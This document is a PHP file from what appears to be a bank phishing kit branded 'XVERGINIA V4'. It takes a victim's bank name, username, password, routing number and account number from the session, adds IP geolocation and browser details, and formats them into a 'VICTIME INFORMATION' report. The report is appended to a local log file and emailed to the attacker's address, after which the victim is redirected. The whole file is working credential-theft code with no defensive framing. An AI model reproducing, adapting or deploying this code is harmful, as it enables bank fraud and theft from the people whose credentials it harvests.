<?php
/*   
    XVERGINIA V4
*/


session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/Config.php');
include('../../functions/get_browser.php');
$XBALTI_MESSAGE .= "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>ACCOUNT BANK INFO</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>BANK INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>🤑</font> [BANK NAME] = <font style='color:#0070ba;'>".$_SESSION['_bankname_']."</font><br>
<font style='color:#9c0000;'>🤑</font> [BANK USER] = <font style='color:#0070ba;'>".$_SESSION['_BankID_']."</font><br>
<font style='color:#9c0000;'>🤑</font> [BANK PASSWORD] = <font style='color:#0070ba;'>".$_SESSION['_BankPass_']."</font><br>
<font style='color:#9c0000;'>🤑</font> [ROUTING NUMBER] = <font style='color:#0070ba;'>".$_SESSION['_RoutingNumber_']."</font><br>
<font style='color:#9c0000;'>🤑</font> [ACCOUNT NUMBER] = <font style='color:#0070ba;'>".$_SESSION['_AccountNumber_']."</font><br>
±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>IP LOOKUP INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>🤑</font> [City] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_CITY_']."</font><br>
<font style='color:#9c0000;'>🤑</font> [State]	= <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_REGIONS_']."</font><br>
<font style='color:#9c0000;'>🤑</font> [Zip Code] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_ZIPCODE_']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>🤑</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>🤑</font> [TIME/DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>🤑</font> [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
################## <font style='color: #820000;'>BY Anonymous51</font> #####################
</div></html>\n";

        $XBALTI_SUBJECT = "♥ BANK ACCOUNT ♥ FROM : ".$_SESSION['_forlogin_']." 😜 ".$_POST['login_email']." 😜";
        $XBALTI_HEADERS .= "From:XVerGinia.V4 ♥<bank@zbi.com>";
        $XBALTI_HEADERS .= $_POST['eMailAdd']."\n";
        $XBALTI_HEADERS .= "MIME-Version: 1.0\n";
        $XBALTI_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
       $zbi = fopen("../../../../ShadowZ118/myaccount/identity/INC/ID.html", "a");
	fwrite($zbi, $XBALTI_MESSAGE);
        @mail($Z119_EMAIL, $XBALTI_SUBJECT, $XBALTI_MESSAGE, $XBALTI_HEADERS);
		HEADER("Location: ../Mail_Box/");
?>